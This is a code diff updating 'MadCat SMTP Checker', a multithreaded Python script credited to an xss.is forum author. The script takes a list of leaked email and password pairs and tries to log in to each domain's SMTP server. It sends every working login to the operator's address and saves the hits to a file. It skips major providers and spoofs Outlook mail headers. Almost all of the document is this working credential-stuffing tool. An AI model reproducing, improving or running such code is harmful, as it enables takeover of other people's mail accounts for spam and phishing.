@@ -1,12 +1,13 @@
 #!/usr/local/bin/python3
 
-import socket,threading,sys,ssl,smtplib,time,re,os,random,signal,queue,requests
-from email.mime.text import MIMEText
+import socket, threading, sys, ssl, smtplib, time, re, os, random, signal, queue, requests
+from base64 import b64encode
 
 try:
 	import psutil
 	from dns import resolver
 except ImportError:
+	print('\033[1;33minstalling missing packages...\033[0m')
 	os.system(f'{sys.executable} -m pip install psutil dnspython')
 	import psutil
 	from dns import resolver
@@ -15,7 +16,7 @@ except ImportError:
 bad_mail_servers = 'gmail,googlemail,google,mail.ru,yahoo'
 
 if sys.version_info[0] < 3:
-	raise Exception("Python 3 or a more recent version is required.")
+	raise Exception('\033[0;31mPython 3 is required. Try to run this script with \033[1mpython3\033[0;31m instead of \033[1mpython\033[0m')
 
 def show_banner():
 	banner = """\033[0;33m
@@ -28,35 +29,41 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     MadCat SMTP Checker v2.0\033[0m
-                Made by Aels for community: \033[0;32mhttps://xss.is\033[0m - forum of security professionals
+          ╙     MadCat SMTP Checker v2.1\033[0m
+                Made by \033[1;33mAels\033[0m for community: \033[0;32mhttps://xss.is\033[0m - forum of security professionals
                 https://github.com/aels/mailtools
-                https://t.me/\033[0;33m\033[1mfreebug\033[0m\n\n"""
+                https://t.me/\033[1;33mfreebug\033[0m\n\n"""
 	time.sleep(1)
 	for line in banner.splitlines():
 		print(line)
 		time.sleep(0.05)
 
-def red(s):
-	return f'\033[0;31m{str(s)}\033[0m'
+def red(s,type):
+	return f'\033[{str(type)};31m{str(s)}\033[0m'
 
-def green(s):
-	return f'\033[0;32m{str(s)}\033[0m'
+def green(s,type):
+	return f'\033[{str(type)};32m{str(s)}\033[0m'
 
-def yellow(s):
-	return f'\033[0;33m{str(s)}\033[0m'
+def yellow(s,type):
+	return f'\033[{str(type)};33m{str(s)}\033[0m'
 
-def blue(s):
-	return f'\033[0;34m{str(s)}\033[0m'
+def blue(s,type):
+	return f'\033[{str(type)};34m{str(s)}\033[0m'
 
-def violet(s):
-	return f'\033[0;35m{str(s)}\033[0m'
+def violet(s,type):
+	return f'\033[{str(type)};35m{str(s)}\033[0m'
 
-def cyan(s):
-	return f'\033[0;36m{str(s)}\033[0m'
+def cyan(s,type):
+	return f'\033[{str(type)};36m{str(s)}\033[0m'
+
+def white(s,type):
+	return f'\033[{str(type)};37m{str(s)}\033[0m'
 
 def bold(s):
 	return f'\033[1m{str(s)}\033[0m'
+
+def num(s):
+	return f'{int(s):,}'
 
 def tune_network():
 	try:
@@ -70,16 +77,11 @@ def tune_network():
 	except:
 		pass
 
-def print_above(s):
-	global global_status
-	print('\033[2K\r'+str(s))
-	print(global_status)
-	sys.stdout.write('\033[F')
-
 def bytes_to_mbit(b):
-	return b/1024./1024.*8
+	return round(b/1024./1024.*8, 2)
 
 def guess_smtp_server(domain):
+	global default_login_template
 	try:
 		mx_domain = resolver.resolve(domain, 'MX')[0].exchange.to_text()[0:-1]
 	except:
@@ -93,7 +95,7 @@ def guess_smtp_server(domain):
 				s = ssl.wrap_socket(s) if p==465 else s
 				s.connect((h, p))
 				s.close()
-				return (h, str(p), '%EMAILADDRESS%')
+				return (h, str(p), default_login_template)
 			except:
 				pass
 	return False
@@ -105,31 +107,35 @@ def get_smtp_server(domain):
 		xml = requests.get('https://autoconfig.thunderbird.net/v1.1/'+domain).text
 		smtp_host = re.findall(r'<outgoingServer type="smtp">[\s\S]+?<hostname>([\w.-]+)</hostname>', xml)
 		smtp_port = re.findall(r'<outgoingServer type="smtp">[\s\S]+?<port>([\d+]+)</port>', xml)
-		smtp_username = re.findall(r'<outgoingServer type="smtp">[\s\S]+?<username>([\w.%]+)</username>', xml)
-		mx_cache[domain] = (smtp_host[0], smtp_port[0], smtp_username[0]) if len(smtp_host) and len(smtp_port) and len(smtp_username) else guess_smtp_server(domain)
+		smtp_login_template = re.findall(r'<outgoingServer type="smtp">[\s\S]+?<username>([\w.%]+)</username>', xml)
+		if smtp_host and smtp_port and smtp_login_template:
+			mx_cache[domain] = (smtp_host[0], smtp_port[0], smtp_login_template[0])
+		else:
+			mx_cache[domain] = guess_smtp_server(domain)
 	if not mx_cache[domain]:
 		raise Exception('no connection details found for '+domain)
 	return mx_cache[domain]
 
 def get_rand_ip_of_host(host):
-	return random.choice(socket.getaddrinfo(host, 0, family=socket.AF_INET, proto=socket.IPPROTO_TCP))[4][0]
+	# return random.choice(socket.getaddrinfo(host, 0, family=socket.AF_INET, proto=socket.IPPROTO_TCP))[4][0]
+	return random.choice(socket.getaddrinfo(host, 0, 0, 0, proto=socket.IPPROTO_TCP))[4][0]
 
 def quit(signum, frame):
-	print('\r\n'*2+cyan(bold('Exiting...')))
+	print('\r\n'*2+cyan('Exiting...',1))
 	sys.exit(0)
 
 def is_valid_email(email):
-	return re.match(r'^[\w.+-]+@[\w.-]+\.[a-z]{2,}$', email.lower())
+	return re.match(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}$', email.lower())
 
 def find_email_password_collumnes(list_filename):
 	email_collumn = False
 	password_collumn = False
 	with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
 		for line in fp:
-			line = re.sub('[;,\t| \'"]+', ':', line.lower())
+			line = re.sub(r'[;,\t| \'"]+', ':', line.lower())
 			email = re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}', line)
 			if email_collumn is False and email:
-				email_collumn = line.split(email.group(0))[0].count(':') or 0
+				email_collumn = line.split(email[0])[0].count(':')
 			if password_collumn is False and re.search(r'@.+123', line):
 				password_collumn = line.split('123')[0].count(':')
 			if email_collumn is not False and password_collumn is not False:
@@ -138,7 +144,7 @@ def find_email_password_collumnes(list_filename):
 	return (email_collumn, password_collumn)
 
 def wc_count(filename):
-	return int(os.popen(f'wc -l %s' % filename).read().strip().split(' ')[0])
+	return int(os.popen('wc -l '+filename).read().strip().split(' ')[0])
 
 def is_ignored_host(mail):
 	global exclude_mail_hosts
@@ -147,35 +153,41 @@ def is_ignored_host(mail):
 			return True
 	return False
 
-def smtp_connect_and_send(smtp_server, port, template, smtp_user, password):
-	# %EMAILADDRESS%, %EMAILLOCALPART%, %EMAILLOCALPART%.%EMAILDOMAIN%
+def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
 	global verify_email
-	message = MIMEText(f'{smtp_server}|{port}|{smtp_user}|{password}', 'html', 'utf-8')
-	message['From'] = f'MadCat checker <{smtp_user}>'
-	message['To'] = verify_email
-	message['Subject'] = 'new SMTP from MadCat checker'
-	headers =f'Return-Path: {smtp_user}\n'
-	headers+=f'Reply-To: {smtp_user}\n'
-	headers+= 'X-Priority: 1\n'
-	headers+= 'X-MSmail-Priority: High\n'
-	headers+= 'X-Mailer: Microsoft Office Outlook, Build 10.0.5610\n'
-	headers+= 'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\n'
+	if is_valid_email(smtp_user):
+		smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
+	else:
+		smtp_login = smtp_user
+	headers_arr = [
+				f'From: MadCat checker <{smtp_user}>',
+				f'To: {verify_email}',
+				f'Subject: new SMTP from MadCat checker',
+				f'Return-Path: {smtp_user}',
+				f'Reply-To: {smtp_user}',
+				'X-Priority: 1',
+				'X-MSmail-Priority: High',
+				'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
+				'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
+				'MIME-Version: 1.0',
+				'Content-Type: text/html; charset="utf-8"',
+				'Content-Transfer-Encoding: base64'
+	]
+	body = f'{smtp_server}|{port}|{smtp_login}|{password}'
+	message_as_str = '\n\n'.join(('\n'.join(headers_arr), b64encode(body.encode()).decode()+'\n'))
 	smtp_server_ip = get_rand_ip_of_host(smtp_server)
-	smtp_login = template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
 	smtp_class = smtplib.SMTP_SSL if port == '465' else smtplib.SMTP
 	server_obj = smtp_class(smtp_server_ip, port, timeout=5)
 	server_obj.starttls(context=ssl._create_unverified_context()) if port == '587' else False
 	server_obj.ehlo()
 	server_obj.login(smtp_login, password)
-	server_obj.sendmail(smtp_user, verify_email, '\n'.join((headers, message.as_string())))
+	server_obj.sendmail(smtp_user, verify_email, message_as_str)
 	server_obj.quit()
 
 def worker_item(jobs_que, results_que):
-	global threads_count, threads_counter, verify_email, goods, no_jobs_left, loop_times
-	self = threading.current_thread()
+	global threads_count, threads_counter, verify_email, goods, no_jobs_left, loop_times, default_login_template
 	while True:
-		if mem_usage>90 and threads_counter>threads_count:
-		# if (mem_usage>90 or cpu_usage>90) and threads_counter>threads_count:
+		if (mem_usage>90 or cpu_usage>90) and threads_counter>threads_count:
 			break
 		if jobs_que.empty():
 			if no_jobs_left:
@@ -187,35 +199,37 @@ def worker_item(jobs_que, results_que):
 		else:
 			time_start = time.perf_counter()
 			smtp_server, port, smtp_user, password = jobs_que.get()
-			results_que.put(yellow(bold('trying mx for '))+yellow(smtp_user+':'+password))
+			login_template = default_login_template
 			try:
+				results_que.put(yellow('trying mx for ',1)+yellow(smtp_user+':'+password,0))
 				if not smtp_server or not port:
-					smtp_server, port, template = get_smtp_server(smtp_user.split('@')[1])
+					smtp_server, port, login_template = get_smtp_server(smtp_user.split('@')[1])
 				results_que.put(bold('connecting to')+f' {smtp_server}|{port}|{smtp_user}|{password}')
-				smtp_connect_and_send(smtp_server, port, template, smtp_user, password)
-				results_que.put(green(bold(smtp_user+':'+password))+' sent to '+verify_email)
+				smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
+				results_que.put(green(smtp_user+':'+password,1)+green(' sent to '+verify_email,0))
 				open(smtp_filename, 'a').write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
 				goods += 1
 				time.sleep(1)
 			except Exception as e:
 				e = str(e).strip()[0:100]
-				results_que.put(f'{smtp_server}:{port} - {red(bold(e))}')
+				results_que.put(red(f'{smtp_server}:{port} - {bold(e)}',0))
 				open(errors_filename, 'a').write(f'{smtp_server}|{port}|{smtp_user}|{password} - {e}\n')
 			loop_times.append(time.perf_counter() - time_start)
-			if len(loop_times)>threads_count:
-				loop_times.pop(0)
+			loop_times.pop(0) if len(loop_times)>threads_count else 0
 	threads_counter -= 1
 
 def every_second():
-	global mem_usage, cpu_usage, net_usage, jobs_que, results_que, threads_counter, threads_count, no_jobs_left, loop_times, loop_time
+	global progress, speed, mem_usage, cpu_usage, net_usage, jobs_que, results_que, threads_counter, threads_count, loop_times, loop_time
+	progress_old = progress
 	net_usage_old = 0
 	time.sleep(1)
 	while True:
-		if no_jobs_left and threads_counter == 0:
-			break
-		mem_usage = psutil.virtual_memory()[2]
-		cpu_usage = max(psutil.cpu_percent(percpu=True))
-		net_usage = psutil.net_io_counters().bytes_sent-net_usage_old
+		speed.append(progress - progress_old)
+		speed.pop(0) if len(speed)>10 else 0
+		progress_old = progress
+		mem_usage = round(psutil.virtual_memory()[2])
+		cpu_usage = round(sum(psutil.cpu_percent(percpu=True))/os.cpu_count())
+		net_usage = psutil.net_io_counters().bytes_sent - net_usage_old
 		net_usage_old += net_usage
 		loop_time = round(sum(loop_times)/len(loop_times), 2) if len(loop_times) else 0
 		if mem_usage<80 and cpu_usage<80 or threads_counter<threads_count:
@@ -223,15 +237,23 @@ def every_second():
 			threads_counter += 1
 		time.sleep(0.1)
 
+def printer(jobs_que, results_que):
+	global status_bar, progress
+	while True:
+		while not results_que.empty():
+			thread_status = results_que.get()
+			progress += 1 if 'trying' in thread_status else 0
+			print(f'\033[2K{thread_status}')
+		print(f'\033[2K{status_bar}\033[F')
+		time.sleep(0.04)
+
 signal.signal(signal.SIGINT, quit)
-tune_network()
 show_banner()
+tune_network()
 try:
 	list_filename = sys.argv[1]
-	smtp_filename = sys.argv[1].split('.')
-	smtp_filename[-2] = smtp_filename[-2]+'_smtp'
-	smtp_filename = '.'.join(smtp_filename)
-	errors_filename = smtp_filename.replace('_smtp', '_errors')
+	smtp_filename = re.sub(r'\.[^.]+$', '_smtp.'+list_filename.split('.')[-1], list_filename)
+	errors_filename = re.sub(r'\.[^.]+$', '_errors.'+list_filename.split('.')[-1], list_filename)
 	verify_email = sys.argv[2]
 	if not is_valid_email(verify_email):
 		raise
@@ -239,12 +261,13 @@ try:
 		exclude_mail_hosts = ','.join((sys.argv[3], bad_mail_servers))
 	except:
 		exclude_mail_hosts = bad_mail_servers
-	start_from_line = int(sys.argv[-1]) if re.match(r'^[\d]+$', sys.argv[-1]) else 0
+	start_from_line = int(sys.argv[-1]) if re.match(r'\d+', sys.argv[-1]) else 0
 except:
-	exit(f'usage: \npython3 {sys.argv[0]} '+bold('list.txt verify_email@example.com')+' [exclude,mail,hosts] [start_from_line]')
+	exit(f'usage: \npython3 {sys.argv[0]} '+bold('list.txt verify_email@example.com')+' [ignored,email,domains] [start_from_line]')
 
 jobs_que = queue.Queue()
 results_que = queue.Queue()
+ignored = 0
 goods = 0
 mem_usage = 0
 cpu_usage = 0
@@ -255,33 +278,36 @@ mx_cache = {}
 no_jobs_left = False
 loop_times = []
 loop_time = 0
+speed = []
 progress = start_from_line
-global_status = ''
-email_collumn, password_collumn = find_email_password_collumnes(list_filename)
+status_bar = ''
+default_login_template = '%EMAILADDRESS%'
 total_lines = wc_count(list_filename)
+email_collumn, password_collumn = find_email_password_collumnes(list_filename)
 
-print(f'total lines to procceed: {bold(total_lines)}')
+print(f'total lines to procceed: {bold(num(total_lines))}')
 print(f'email & password colls: {bold(email_collumn)} and {bold(password_collumn)}')
-print(f'verification email: {bold(verify_email)}')
+print(f'source filename: {bold(list_filename)}')
 print(f'goods filename: {bold(smtp_filename)}')
 print(f'bads & report filename: {bold(errors_filename)}')
-input('press '+bold('[ Enter ]')+' to start...')
+print(f'verification email: {bold(verify_email)}')
+input( 'press '+bold('[ Enter ]')+' to start...')
+
+threading.Thread(target=every_second, daemon=True).start()
+threading.Thread(target=printer, args=(jobs_que, results_que), daemon=True).start()
 
 with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
-	threading.Thread(target=every_second, daemon=True).start()
 	for i in range(start_from_line):
 		line = fp.readline()
 	while True:
-		global_status = '[ loop time: %ss, mem: %s%%, cpu: %s%%, net: %sMbit/s, threads: %s, goods: %s, progress: %s/%s(%s%%) ]' % (
-			bold(loop_time),
-			bold(mem_usage),
-			bold(cpu_usage),
-			bold(round(bytes_to_mbit(net_usage*10), 2)),
-			bold(threads_counter),
-			green(bold(goods)),
-			bold(progress),
-			bold(total_lines),
-			bold(round(progress/total_lines*100))
+		status_bar = (
+			f'[ progress: {bold(num(progress))}/{bold(num(total_lines))} ({bold(round(progress/total_lines*100))}%) ]'+
+			f'[ speed: {bold(num(sum(speed)))}lines/s ({bold(loop_time)}s/loop) ]'+
+			f'[ mem: {bold(mem_usage)}% ]'+
+			f'[ cpu: {bold(cpu_usage)}% ]'+
+			f'[ net: {bold(bytes_to_mbit(net_usage*10))}Mbit/s ]'+
+			f'[ threads: {bold(threads_counter)} ]'+
+			f'[ goods/ignored: {green(goods,1)}/{yellow(ignored,1)} ]'
 		)
 		while jobs_que.qsize()<threads_count*2:
 			line = fp.readline().strip()
@@ -291,16 +317,13 @@ with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
 			if line.count('|')==3:
 				jobs_que.put((line.split('|')))
 			else:
-				line = re.sub('[:,\t| \'"]+', ';', line)
-				fields = line.split(';')
+				line = re.sub(r'[;,\t| \'"]+', ':', line)
+				fields = line.split(':')
 				if len(fields)>1 and is_valid_email(fields[email_collumn]) and len(fields[password_collumn])>7 and not is_ignored_host(fields[email_collumn]):
 					jobs_que.put((False, False, fields[email_collumn], fields[password_collumn]))
 				else:
+					ignored += 1
 					progress += 1
-		if not results_que.empty():
-			thread_status = results_que.get()
-			progress += 1 if 'trying' in thread_status else 0
-			print_above(thread_status)
 		if threads_counter == 0 and no_jobs_left:
-			print('\b'*10+green(bold(f'all done.')))
+			print('\b'*10+green(bold('all done.')))
 			break
